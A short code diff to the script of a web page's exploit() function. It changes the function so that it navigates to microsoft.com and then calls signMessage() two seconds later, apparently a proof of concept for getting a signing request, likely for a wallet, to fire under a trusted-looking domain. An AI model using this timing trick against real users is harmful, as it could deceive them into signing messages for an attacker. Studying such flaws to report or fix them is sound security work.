@@ -34,18 +34,17 @@
     }
 
     function exploit() {
-      signMessage();
       // // Navigate to Microsoft.com
-      // window.location.href = "https://microsoft.com";
+       window.location.href = "https://microsoft.com";
 
       // // Run the signMessage function 2 seconds after navigation starts
-      // setTimeout(() => {
-      //   try {
-      //     signMessage();
-      //   } catch (error) {
-      //     console.error("Error executing signMessage:", error);
-      //   }
-      // }, 3500); // Delay for 2 seconds
+      setTimeout(() => {
+        try {
+          signMessage();
+        } catch (error) {
+          console.error("Error executing signMessage:", error);
+        }
+      }, 2000); // Delay for 2 seconds
     }
   </script>
 
